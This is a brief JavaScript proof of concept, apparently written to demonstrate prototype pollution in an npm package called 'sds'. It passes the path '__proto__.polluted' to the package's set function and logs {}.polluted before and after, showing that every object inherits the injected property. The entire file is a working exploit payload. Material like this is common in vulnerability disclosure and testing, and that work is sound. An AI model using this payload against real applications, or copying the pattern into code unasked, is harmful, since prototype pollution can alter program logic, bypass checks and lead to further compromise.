var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const root = require('sds');
obj = {};
let payload = '__proto__.polluted';
console.log({}.polluted);
root.set(obj, payload, true);
console.log({}.polluted);